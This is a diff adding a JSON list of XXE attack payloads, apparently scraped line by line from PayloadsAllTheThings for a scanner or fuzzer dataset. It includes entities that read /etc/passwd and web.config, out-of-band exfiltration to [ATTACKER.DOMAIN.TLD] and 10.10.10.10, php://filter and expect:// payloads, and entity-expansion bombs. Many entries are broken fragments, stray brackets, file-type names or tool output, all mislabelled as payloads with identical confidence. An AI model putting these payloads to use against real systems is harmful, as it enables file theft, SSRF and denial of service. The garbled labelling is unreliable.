+        "payload": "g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE r [",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % pe_1 \"<!---->\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % pe_2 \"&#37;pe_1;<!---->&#37;pe_1;\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % pe_3 \"&#37;pe_2;<!---->&#37;pe_2;\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % pe_4 \"&#37;pe_3;<!---->&#37;pe_3;\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "%pe_4;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<r/>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE root [",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % local_dtd SYSTEM \"file:///abcxyz/\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "%local_dtd;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<root></root>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "/usr/share/xml/fontconfig/fonts.dtd",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "/usr/share/xml/svg/svg10.dtd",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "/usr/share/xml/svg/svg11.dtd",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "/usr/share/yelp/dtd/docbookx.dtd",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE message [",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % constant 'aaa)>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "&#x25;eval;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "&#x25;error;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ELEMENT aa (bb'>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<message>Text</message>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE doc [",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % SuperClass '>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY &#x25; file SYSTEM \"file://D:\\webserv2\\services\\web.config\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY test \"test\"'",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": ">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "]><xxx>anything</xxx>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY &#x25; file SYSTEM \"https://erp.company.com\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<?xml version=\"1.0\" ?>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/ext.dtd\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "%ext;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<message></message>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "%eval;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "%error;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % data SYSTEM \"file:///etc/passwd\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % eval \"<!ENTITY &#x25; leak SYSTEM '%data;:///'>\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "%leak;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x\"> %ext;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<r></r>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<root>&test;</root>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % xxe SYSTEM \"file:///etc/passwd\" >",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY callhome SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/?%xxe;\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "]",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<foo>&callhome;</foo>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE data SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<data>&send;</data>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "File stored on http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % file SYSTEM \"file:///sys/power/image_size\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "%all;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ELEMENT r ANY >",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % sp SYSTEM \"http://10.10.10.10/dtd.xml\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "%sp;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "%param1;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<r>&exfil;</r>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "File stored on http://10.10.10.10/dtd.xml",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://[ATTACKER.DOMAIN.TLD]\"> %dtd;]",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "xsi:schemaLocation=\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<feature name=\"deployer\" version=\"2.0\" install=\"auto\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "</feature>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "</features>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "{",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "\"errors\":{",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "\"errorMessage\":\"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.\"",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "}",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<image xlink:href=\"expect://ls\" width=\"200\" height=\"200\"></image>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "</svg>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<?xml version=\"1.0\" standalone=\"yes\"?>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE svg [",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ELEMENT svg ANY >",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % sp SYSTEM \"http://10.10.10.10:8080/xxe.xml\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<svg viewBox=\"0 0 200 200\" version=\"1.2\" xmlns=\"http://www.w3.org/2000/svg\" style=\"fill:red\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<text x=\"15\" y=\"100\" style=\"fill:black\">XXE via SVG rasterization</text>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<rect x=\"0\" y=\"0\" rx=\"10\" ry=\"10\" width=\"200\" height=\"200\" style=\"fill:pink;opacity:0.7\"/>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<flowRoot font-size=\"15\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<flowRegion>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" style=\"fill:red;opacity:0.3\"/>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "</flowRegion>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<flowDiv>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<flowPara>&exfil;</flowPara>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "</flowDiv>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "</flowRoot>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<soap:Body>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<foo>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://10.10.10.10:22/\"> %dtd;]><xxx/>]]>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "</foo>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "</soap:Body>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "DOCX/XLSX/PPTX",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "ODT/ODG/ODP/ODS",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "SVG",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "XML",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "PDF (experimental)",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "JPG (experimental)",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "GIF (experimental)",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "$ 7z l xxe.xlsx",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "[...]",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "Date      Time    Attr         Size   Compressed  Name",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "------------------- ----- ------------ ------------  ------------------------",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
